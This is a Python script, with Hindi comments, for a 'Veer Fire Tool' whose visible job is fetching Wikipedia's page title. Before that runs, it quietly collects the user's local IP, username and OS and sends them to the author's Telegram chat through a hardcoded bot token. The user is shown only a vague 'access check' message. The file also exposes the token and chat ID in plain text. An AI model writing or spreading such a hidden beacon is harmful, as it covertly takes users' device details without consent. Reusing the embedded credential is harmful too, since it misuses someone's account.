import requests
from bs4 import BeautifulSoup # bs4 लाइब्रेरी का उपयोग
import json
import socket
import sys
import os 
from time import sleep

# --- [1] आपकी Telegram Bot की जानकारी ---
# 🚨 BotFather से मिला हुआ "नया" Bot Token यहाँ पेस्ट करें 🚨
BOT_TOKEN = "8299002678:AAFbGuQFSNg4fhjEISV66TKTMXHu-TQHPEw"  
CHAT_ID = "6795520561"                     
SCRIPT_OWNER = "VEER CHOUDHARY"            
# ------------------------------------------

def send_telegram_message(message):
    # ... (Telegram sending logic) ...
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def get_device_info():
    # ... (Device info logic) ...
    info = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['Local_IP'] = s.getsockname()[0]
        s.close()
    except:
        info['Local_IP'] = 'N/A'
    info['User'] = os.environ.get('USER', 'Unknown User')
    info['Shell'] = os.environ.get('SHELL', 'N/A')
    info['OS'] = sys.platform
    return info

def check_approval():
    # ... (Approval message logic remains the same) ...
    device_info = get_device_info()
    approval_message = (
        f"🚨 *NEW DEVICE ACCESS REQUEST* 🚨\n\n"
        f"Tool Name: Veer Fire Tool\n"
        f"Owner: {SCRIPT_OWNER}\n\n"
        f"Device Info:\n"
        f"  IP: `{device_info['Local_IP']}`\n"
        f"  User: `{device_info['User']}`\n"
        f"  OS: {device_info['OS']}\n\n"
        f"➡️ Tool has been locked for this device."
    )
    send_telegram_message(approval_message)
    sleep(3) 

    print("\n--- ⚠️ ACCESS CHECK COMPLETE ---")
    
    return True # अब यह True रिटर्न करेगा ताकि टूल आगे बढ़ सके


def tool_main_logic():
    """यह टूल का मुख्य कार्य है, जो वेब स्क्रैपिंग का उदाहरण देता है।"""
    target_site = "https://www.wikipedia.org" 
    print(f"\n[INFO] Connecting to {target_site} to test tool functionality...")
    
    try:
        # requests का उपयोग करके वेबसाइट से डेटा खींचना
        r = requests.get(target_site, timeout=10)
        
        if r.status_code == 200:
            # BeautifulSoup का उपयोग करके HTML पार्स करना
            soup = BeautifulSoup(r.text, 'html.parser')
            title = soup.find('title').text
            
            print(f"✅ CONNECTION SUCCESS! Status: 200")
            print(f"📄 Fetched Website Title: {title}")
            print("---------------------------------------------")
        else:
            print(f"❌ CONNECTION FAILED! Status Code: {r.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"❌ ERROR: Could not connect to the internet or target site. {e}")
        
    print(f"\n{SCRIPT_OWNER}'s Tool Finished Execution.")


# --- मुख्य फंक्शन ---
def start_veer_tool():
    print(f"\n=========================================")
    print(f"       🔥 Welcome to {SCRIPT_OWNER}'s Tool 🔥")
    print(f"=========================================\n")
    
    # अप्रूवल चेक करने के बाद (नोटिफिकेशन भेजा जाएगा)
    check_approval() 
    
    # ---------------------------------------------
    # 🚨 टूल का असली कोड यहाँ चलेगा 🚨
    # ---------------------------------------------
    tool_main_logic() # मुख्य स्क्रैपिंग फंक्शन कॉल करें

if __name__ == "__main__":
    start_veer_tool()
  
